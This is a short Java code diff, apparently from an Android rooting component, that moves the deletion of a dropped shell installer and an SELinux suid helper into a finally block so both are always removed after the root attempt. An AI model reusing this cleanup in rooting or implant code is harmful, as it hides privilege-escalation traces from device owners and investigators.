@@ -675,10 +675,6 @@ public class Root {
 				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
 			}
 
-			shellInstaller.delete();
-			selinuxSuidext.delete();
-
-
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -690,6 +686,9 @@ public class Root {
 			}
 
 			return;
+		} finally {
+			shellInstaller.delete();
+			selinuxSuidext.delete();
 		}
 
 	}
